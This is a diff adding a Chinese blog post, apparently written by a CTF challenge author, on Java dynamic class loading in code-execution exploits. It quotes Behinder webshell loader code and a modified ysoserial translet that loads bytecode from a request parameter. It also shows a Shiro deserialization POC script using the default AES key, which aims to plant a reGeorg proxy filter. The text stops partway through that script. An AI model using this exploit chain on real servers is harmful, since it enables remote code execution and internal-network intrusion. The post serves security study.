@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l3yx.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="今年SCTF和另一个师傅一起出了道题，其中环境就是完全不出网的Spring boot + Shiro，要对其进行内网渗透，所以就有了下文的思路，通过改造ysoserial，reGeorg，使用动态加载类的方法，突破header头长度的限制，攻击Shiro并把reGeorg注册为filter，提供代理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码执行漏洞中类动态加载的应用">
+<meta property="og:url" content="https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/index.html">
+<meta property="og:site_name" content="l3yx&#39;s blog">
+<meta property="og:description" content="今年SCTF和另一个师傅一起出了道题，其中环境就是完全不出网的Spring boot + Shiro，要对其进行内网渗透，所以就有了下文的思路，通过改造ysoserial，reGeorg，使用动态加载类的方法，突破header头长度的限制，攻击Shiro并把reGeorg注册为filter，提供代理">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200705130850198.png">
+<meta property="og:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151537094.png">
+<meta property="og:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151808170.png">
+<meta property="og:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703150835555.png">
+<meta property="og:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703151936423.png">
+<meta property="og:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200703152027686.png">
+<meta property="article:published_time" content="2020-07-06T11:52:44.000Z">
+<meta property="article:modified_time" content="2020-07-06T12:26:40.000Z">
+<meta property="article:author" content="淚笑">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="ysoserial">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3yx.github.io/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200705130850198.png">
+
+
+<link rel="canonical" href="https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/","path":"2020/07/06/Java代码执行漏洞中类动态加载的应用/","title":"Java代码执行漏洞中类动态加载的应用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java代码执行漏洞中类动态加载的应用 | l3yx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">l3yx's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.</span> <span class="nav-text">Java类动态加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89ClassLoader"><span class="nav-number">2.</span> <span class="nav-text">自定义ClassLoader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8defineClass"><span class="nav-number">3.</span> <span class="nav-text">反射调用defineClass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8A%E8%BD%BDreGeorg%E4%BB%A3%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">Shiro反序列化上载reGeorg代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E9%80%A0ysoserial"><span class="nav-number">4.1.</span> <span class="nav-text">改造ysoserial</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E9%80%A0reGeorg"><span class="nav-number">4.2.</span> <span class="nav-text">改造reGeorg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">4.3.</span> <span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="淚笑"
+      src="/resources/avatar.jpg">
+  <p class="site-author-name" itemprop="name">淚笑</p>
+  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/resources/avatar.jpg">
+      <meta itemprop="name" content="淚笑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l3yx's blog">
+      <meta itemprop="description" content="学的越多，懂的越少">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java代码执行漏洞中类动态加载的应用 | l3yx's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java代码执行漏洞中类动态加载的应用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-07-06 19:52:44 / 修改时间：20:26:40" itemprop="dateCreated datePublished" datetime="2020-07-06T19:52:44+08:00">2020-07-06</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>今年SCTF和另一个师傅一起出了道题，其中环境就是完全不出网的Spring boot + Shiro，要对其进行内网渗透，所以就有了下文的思路，通过改造ysoserial，reGeorg，使用动态加载类的方法，突破header头长度的限制，攻击Shiro并把reGeorg注册为filter，提供代理</p>
+<span id="more"></span>
+
+<h2 id="Java类动态加载"><a href="#Java类动态加载" class="headerlink" title="Java类动态加载"></a>Java类动态加载</h2><p>Java中类的加载方式分为显式和隐式，隐式加载是通过<code>new</code>等途径生成的对象时Jvm把相应的类加载到内存中，显示加载是通过<code>Class.forName(..)</code>等方式由程序员自己控制加载，而显式类加载方式也可以理解为类动态加载，我们也可以自定义类加载器去加载任意的类。</p>
+<h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，其他子类加载器例如<code>URLClassLoader</code>都是通过继承<code>java.lang.ClassLoader</code>然后重写父类方法从而实现了加载目录class文件或者远程资源文件</p>
+<p>在网站管理工具”冰蝎”中用到了这种方法</p>
+<p>冰蝎服务端核心代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        <span class="built_in">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(classBytes).newInstance().equals(pageContext);</span><br></pre></td></tr></table></figure>
+
+<p>代码中创建了U类继承ClassLoader，然后自定义一个名为g的方法，接收字节数组类型的参数并调用父类的defineClass动态解析字节码返回Class对象，然后实例化该类并调用equals方法，传入jsp上下文中的pageContext对象。</p>
+<p>其中classBytes就是由冰蝎客户端发送至服务端的字节码，该字节码所代表的类中重写了equals方法，从pageContext中提取request，response等对象作参数的获取和执行结果的返回</p>
+<h2 id="反射调用defineClass"><a href="#反射调用defineClass" class="headerlink" title="反射调用defineClass"></a>反射调用defineClass</h2><p>上文中新建了一个类来实现动态加载字节码的功能，但在某些利用场景使用有一定限制，所以也可以直接通过反射调用ClassLoader的defineClass方法动态加载字节码而不用新建其他Java类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(<span class="keyword">new</span> <span class="title class_">ClassLoader</span>()&#123;&#125;, classBytes, <span class="number">0</span>, classBytes.length);</span><br></pre></td></tr></table></figure>
+
+<p>在调用defineClass时，重新实例化了一个ClassLoader，<code>new ClassLoader()&#123;&#125;</code>，这是因为在Java中类的唯一性由类加载器和类本身决定，如果沿用当前上下文中的类加载器实例，而POC中使用同一个类名多次攻击，可能出现类重复定义异常</p>
+<p><img src="/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200705130850198.png" alt="image-20200705130850198"></p>
+<h2 id="Shiro反序列化上载reGeorg代理"><a href="#Shiro反序列化上载reGeorg代理" class="headerlink" title="Shiro反序列化上载reGeorg代理"></a>Shiro反序列化上载reGeorg代理</h2><p>举个实际应用的例子，针对一个完全不出网的Spring Boot + Shiro程序如何进行内网渗透，这种情况下不能写Jsp马，而且不能出网自然不能作反弹Shell等操作，要进行内网渗透我觉得最好的方式就是动态注册filter或者servlet，并将reGeorg的代码嵌入其中，但如果将POC都写在header中，肯定会超过中间件header长度限制，当然在某些版本也有办法修改这个长度限制，参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a>，如果采用上文中从外部加载字节码的方法那么这个问题就迎刃而解</p>
+<h3 id="改造ysoserial"><a href="#改造ysoserial" class="headerlink" title="改造ysoserial"></a>改造ysoserial</h3><p>为了在ysoserial中正常使用下文中提到的类，需要先在pom.xml中加入如下依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.50<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>要让反序列化时运行指定的Java代码，需要借助TemplatesImpl，在ysoserial中新建一个类并继承AbstractTranslet，这里有不理解的可以参考<a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl">有关TemplatesImpl的反序列化漏洞链</a></p>
+<p>静态代码块中获取了Spring Boot上下文里的request，response和session，然后获取classData参数并通过反射调用defineClass动态加载此类，实例化后调用其中的equals方法传入request，response和session三个对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">            java.lang.reflect.Field r=request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            r.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span>((org.apache.catalina.connector.Request) r.get(request)).getResponse();</span><br><span class="line">            javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line">            String classData=request.getParameter(<span class="string">&quot;classData&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] classBytes = <span class="keyword">new</span> <span class="title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(classData);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">            defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, <span class="number">0</span>,classBytes.length);</span><br><span class="line">            cc.newInstance().equals(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request,response,session&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, SerializationHandler[] arg1)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后在ysoserial.payloads.util包的Gadgets类中照着原有的createTemplatesImpl方法添加一个createTemplatesImpl(Class c)，参数即为我们要让服务端加载的类，如下直接将传入的c转换为字节码赋值给了_bytecodes</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span><span class="params">(Class c)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class&lt;T&gt; tplClass = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        tplClass = (Class&lt;T&gt;) Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        tplClass = (Class&lt;T&gt;) TemplatesImpl.class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = ClassFiles.classAsBytes(c);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后复制CommonsBeanutils1.java的代码增加一个payload CommonsBeanutils1_ClassLoader.java，再把其中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>打包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+
+
+
+<p>借以下脚本生成POC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment">#pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">IV   = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span 